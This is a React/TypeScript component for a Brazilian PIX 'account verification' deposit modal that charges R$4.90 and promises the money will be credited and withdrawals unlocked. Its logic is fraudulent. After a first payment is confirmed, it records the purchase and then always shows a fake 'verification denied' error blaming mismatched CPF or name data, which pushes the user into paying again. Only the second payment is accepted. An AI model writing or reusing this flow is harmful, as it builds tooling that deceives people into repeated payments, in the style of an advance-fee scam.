import React, { useState, useEffect, useRef } from 'react';
import { X, Shield, CheckCircle, Copy, QrCode, AlertTriangle, Info } from 'lucide-react';
import { useFictionalPix } from '../hooks/useFictionalPix';
import { QRCodeGenerator } from './QRCodeGenerator';
import { trackPurchase } from '../utils/tracking';

interface KYCDepositModalProps {
  isOpen: boolean;
  onClose: () => void;
  onVerificationComplete: () => void;
  onVerificationFailed: () => void;
  depositAttempt: number;
}

export const KYCDepositModal: React.FC<KYCDepositModalProps> = ({
  isOpen,
  onClose,
  onVerificationComplete,
  onVerificationFailed,
  depositAttempt
}) => {
  const [isGenerating, setIsGenerating] = useState(false);
  const [pixGenerated, setPixGenerated] = useState(false);
  const [copied, setCopied] = useState(false);
  const [processingPayment, setProcessingPayment] = useState(false);
  const [showError, setShowError] = useState(false);
  const [errorTimer, setErrorTimer] = useState(0);
  const { pixData, createPix, checkPixStatus, reset } = useFictionalPix();
  const paymentCheckIntervalRef = useRef<NodeJS.Timeout | null>(null);
  const isProcessingRef = useRef(false);
  const hasTrackedPurchaseRef = useRef(false);

  const DEPOSIT_AMOUNT = 4.90;
  const isFirstAttempt = depositAttempt === 1;

  useEffect(() => {
    if (!isOpen) {
      if (paymentCheckIntervalRef.current) {
        clearInterval(paymentCheckIntervalRef.current);
        paymentCheckIntervalRef.current = null;
      }
      setIsGenerating(false);
      setPixGenerated(false);
      setCopied(false);
      setProcessingPayment(false);
      setShowError(false);
      setErrorTimer(0);
      isProcessingRef.current = false;
      hasTrackedPurchaseRef.current = false;
      reset();
    }
  }, [isOpen, reset]);

  useEffect(() => {
    if (!pixData || !isOpen || !pixGenerated) return;

    const checkPayment = async () => {
      if (isProcessingRef.current) return;

      try {
        const status = await checkPixStatus(pixData.transactionId);

        if (status.status === 'paid' && !isProcessingRef.current) {
          isProcessingRef.current = true;

          if (paymentCheckIntervalRef.current) {
            clearInterval(paymentCheckIntervalRef.current);
            paymentCheckIntervalRef.current = null;
          }

          setProcessingPayment(true);

          if (isFirstAttempt && !hasTrackedPurchaseRef.current) {
            trackPurchase(status.value);
            hasTrackedPurchaseRef.current = true;
          }

          setTimeout(() => {
            if (isFirstAttempt) {
              setShowError(true);

              let countdown = 20;
              setErrorTimer(countdown);

              const countdownInterval = setInterval(() => {
                countdown -= 1;
                setErrorTimer(countdown);

                if (countdown <= 0) {
                  clearInterval(countdownInterval);
                }
              }, 1000);

              setTimeout(() => {
                clearInterval(countdownInterval);
                onVerificationFailed();
                setTimeout(() => {
                  onClose();
                }, 500);
              }, 20000);
            } else {
              onVerificationComplete();

              setTimeout(() => {
                onClose();
              }, 2000);
            }
          }, 2000);
        }
      } catch (err) {
        console.error('Erro ao verificar pagamento:', err);
      }
    };

    checkPayment();
    const interval = setInterval(checkPayment, 3000);
    paymentCheckIntervalRef.current = interval;

    return () => {
      if (interval) clearInterval(interval);
    };
  }, [pixData, isOpen, pixGenerated, checkPixStatus, onVerificationComplete, onVerificationFailed, onClose, isFirstAttempt]);

  const handleGeneratePix = async () => {
    setIsGenerating(true);

    try {
      await createPix(DEPOSIT_AMOUNT);
      setPixGenerated(true);
    } catch (err) {
      console.error('Erro ao gerar PIX:', err);
    } finally {
      setIsGenerating(false);
    }
  };

  const copyPixCode = async () => {
    if (!pixData?.qrcode) return;

    try {
      await navigator.clipboard.writeText(pixData.qrcode);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch (err) {
      console.error('Erro ao copiar:', err);
    }
  };

  if (!isOpen) return null;

  if (showError) {
    return (
      <div className="fixed inset-0 bg-black/90 backdrop-blur-sm flex items-center justify-center p-3 z-[70] overflow-y-auto">
        <div className="bg-gray-900 rounded-2xl shadow-2xl w-full max-w-[340px] border border-orange-500 animate-scale-in my-4">
          <div className="bg-orange-500/20 p-3 border-b border-orange-500/30">
            <div className="flex items-center justify-center gap-2">
              <AlertTriangle className="w-4 h-4 text-orange-400" />
              <h3 className="text-white font-bold text-sm">Verificacao Negada</h3>
            </div>
          </div>

          <div className="p-3 space-y-2.5">
            <div className="bg-orange-500/10 rounded-lg p-2.5 border border-orange-500/30">
              <p className="text-orange-200 text-xs font-semibold mb-1.5 text-center leading-relaxed">
                Os dados nao correspondem ao titular da conta PIX
              </p>
              <p className="text-gray-300 text-[10px] leading-relaxed text-center">
                CPF, nome e data de nascimento devem ser identicos aos cadastrados no banco
              </p>
            </div>

            <div className="bg-blue-500/10 rounded-lg p-2.5 border border-blue-500/30">
              <div className="flex items-start gap-1.5">
                <Info className="w-3.5 h-3.5 text-blue-400 mt-0.5 flex-shrink-0" />
                <div className="flex-1">
                  <h4 className="text-blue-300 font-bold text-[10px] mb-1">Como resolver:</h4>
                  <ul className="text-blue-200 text-[9px] space-y-0.5 leading-relaxed">
                    <li>• Confira se digitou seu CPF corretamente</li>
                    <li>• Use seu nome completo sem abreviacoes</li>
                    <li>• Verifique a data de nascimento</li>
                    <li>• Dados devem ser do titular da conta</li>
                  </ul>
                </div>
              </div>
            </div>

            <div className="bg-green-500/10 rounded-lg p-2 border border-green-500/30">
              <p className="text-green-300 text-[10px] text-center leading-relaxed">
                Apos corrigir, verificacao sera aprovada e valor creditado
              </p>
            </div>

            <div className="bg-gray-800 rounded-lg p-2.5 border border-gray-700">
              <div className="flex items-center justify-center gap-2">
                <div className="w-4 h-4 border-2 border-orange-400 border-t-transparent rounded-full animate-spin"></div>
                <p className="text-gray-300 text-xs font-semibold">
                  Voltando em {errorTimer}s...
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  if (processingPayment && !showError) {
    return (
      <div className="fixed inset-0 bg-black/90 backdrop-blur-sm flex items-center justify-center p-4 z-[70]">
        <div className="bg-gray-900 rounded-2xl shadow-2xl w-full max-w-sm border border-gray-800 p-6">
          <div className="text-center">
            <div className="w-16 h-16 bg-accent/20 rounded-full flex items-center justify-center mx-auto mb-3">
              <div className="w-8 h-8 border-3 border-accent border-t-transparent rounded-full animate-spin"></div>
            </div>
            <h3 className="text-white font-bold text-lg mb-2">Validando Pagamento</h3>
            <p className="text-gray-400 text-xs">
              Verificando seu deposito...
            </p>
          </div>
        </div>
      </div>
    );
  }

  if (pixGenerated && pixData) {
    return (
      <div className="fixed inset-0 bg-black/90 backdrop-blur-sm flex items-center justify-center p-3 z-[70] overflow-y-auto">
        <div className="bg-gray-900 rounded-2xl shadow-2xl w-full max-w-[340px] border border-gray-800 my-4">
          <div className="bg-accent p-2.5 rounded-t-2xl sticky top-0 z-10">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2">
                <div className="w-7 h-7 bg-white/20 rounded-full flex items-center justify-center flex-shrink-0">
                  <Shield className="w-3.5 h-3.5 text-white" />
                </div>
                <div className="flex-1 min-w-0">
                  <h3 className="text-white font-bold text-xs truncate">PIX de Verificacao</h3>
                  <p className="text-white/80 text-[10px]">R$ {pixData.amount.toFixed(2).replace('.', ',')}</p>
                </div>
              </div>
              <button
                onClick={onClose}
                className="w-6 h-6 bg-white/20 rounded-full flex items-center justify-center hover:bg-white/30 transition-all flex-shrink-0"
                style={{ touchAction: 'manipulation' }}
              >
                <X className="w-3.5 h-3.5 text-white" />
              </button>
            </div>
          </div>

          <div className="p-3 space-y-2.5">
            <div className="bg-gray-800/50 rounded-xl p-2.5 text-center border border-accent/30">
              <div className="bg-white rounded-lg p-2 inline-block mb-1.5 shadow-lg">
                <QRCodeGenerator
                  value={pixData.qrcode}
                  size={140}
                  className="mx-auto"
                />
              </div>
              <p className="text-gray-300 text-[10px] font-semibold">Escaneie com seu banco</p>
            </div>

            <div className="bg-gray-800/50 rounded-lg p-2 border border-gray-700">
              <p className="text-gray-400 text-[9px] mb-1.5 text-center font-semibold">Codigo Copia e Cola:</p>
              <input
                type="text"
                value={pixData.qrcode}
                readOnly
                className="w-full px-2 py-1.5 bg-gray-900 border border-gray-700 rounded text-[9px] font-mono mb-1.5 focus:outline-none text-white select-all leading-tight"
                onClick={(e) => (e.target as HTMLInputElement).select()}
              />
              <button
                onClick={copyPixCode}
                className={`w-full py-2 rounded-lg font-bold transition-all duration-300 active:scale-95 text-[10px] ${
                  copied
                    ? 'bg-green-500 text-white'
                    : 'bg-accent text-white hover:bg-accent-hover'
                }`}
                style={{ touchAction: 'manipulation' }}
              >
                {copied ? (
                  <div className="flex items-center justify-center gap-1">
                    <CheckCircle className="w-3 h-3" />
                    <span>Copiado!</span>
                  </div>
                ) : (
                  <div className="flex items-center justify-center gap-1">
                    <Copy className="w-3 h-3" />
                    <span>Copiar Codigo PIX</span>
                  </div>
                )}
              </button>
            </div>

            <div className="bg-green-900/50 border border-green-600 rounded-lg p-2">
              <div className="flex items-center justify-center gap-1.5">
                <div className="w-3 h-3 border-2 border-green-400 border-t-transparent rounded-full animate-spin flex-shrink-0"></div>
                <p className="text-green-200 text-[10px] font-semibold">
                  Aguardando confirmacao
                </p>
              </div>
            </div>

            <div className="bg-blue-500/10 rounded-lg p-2 border border-blue-500/30">
              <p className="text-blue-200 text-[9px] text-center leading-relaxed">
                Apos o pagamento, sua conta sera verificada automaticamente
              </p>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="fixed inset-0 bg-black/90 backdrop-blur-sm flex items-center justify-center p-3 z-[70] overflow-y-auto">
      <div className="bg-gray-900 rounded-2xl shadow-2xl w-full max-w-[340px] border border-gray-800 my-4">
        <div className="bg-accent p-2.5 rounded-t-2xl relative">
          <button
            onClick={onClose}
            className="absolute top-2 right-2 text-white/80 hover:text-white transition-colors z-10 w-6 h-6 flex items-center justify-center"
            style={{ touchAction: 'manipulation' }}
          >
            <X className="w-3.5 h-3.5" />
          </button>

          <div className="text-center pt-1">
            <div className="w-9 h-9 bg-white/20 rounded-full flex items-center justify-center mx-auto mb-1.5">
              <Shield className="w-4 h-4 text-white" />
            </div>
            <h2 className="text-base font-bold text-white mb-0.5">Verificacao de Conta</h2>
            <p className="text-white/80 text-[10px]">Confirme sua titularidade</p>
          </div>
        </div>

        <div className="p-3 space-y-2.5">
          <div className="bg-gray-800/50 rounded-lg p-3 border border-gray-700">
            <div className="w-10 h-10 bg-accent/20 rounded-full flex items-center justify-center mx-auto mb-2">
              <Shield className="w-5 h-5 text-accent" />
            </div>
            <h3 className="text-white font-bold text-sm mb-1.5 text-center">Verificacao de Titularidade</h3>
            <p className="text-gray-300 text-[10px] mb-2.5 text-center leading-relaxed">
              Deposito minimo via PIX para confirmar sua identidade
            </p>

            <div className="bg-accent/10 rounded-lg p-2.5 mb-2.5 border border-accent/30">
              <div className="text-accent text-xl font-bold mb-0.5 text-center">
                R$ {DEPOSIT_AMOUNT.toFixed(2).replace('.', ',')}
              </div>
              <p className="text-gray-400 text-[9px] text-center">Deposito de verificacao</p>
            </div>

            <div className="bg-green-500/10 rounded-lg p-2 mb-2.5 border border-green-500/30">
              <div className="flex items-start gap-1.5">
                <CheckCircle className="w-3.5 h-3.5 text-green-400 mt-0.5 flex-shrink-0" />
                <div className="flex-1">
                  <h4 className="text-green-300 font-bold text-[10px] mb-0.5">Valor sera creditado</h4>
                  <p className="text-green-200 text-[9px] leading-relaxed">
                    Adicionado ao saldo apos verificacao
                  </p>
                </div>
              </div>
            </div>

            <button
              onClick={handleGeneratePix}
              disabled={isGenerating}
              className="w-full bg-accent text-white font-bold py-2.5 rounded-lg hover:bg-accent-hover transition-all duration-300 active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed text-xs"
              style={{ touchAction: 'manipulation' }}
            >
              {isGenerating ? (
                <div className="flex items-center justify-center gap-1.5">
                  <div className="w-3.5 h-3.5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                  <span>Gerando PIX...</span>
                </div>
              ) : (
                'Gerar PIX de Verificacao'
              )}
            </button>
          </div>

          <div className="bg-blue-500/10 rounded-lg p-2 border border-blue-500/30">
            <div className="flex items-start gap-1.5">
              <Shield className="w-3 h-3 text-blue-400 mt-0.5 flex-shrink-0" />
              <p className="text-blue-200 text-[9px] leading-relaxed">
                Saques liberados automaticamente apos confirmacao
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
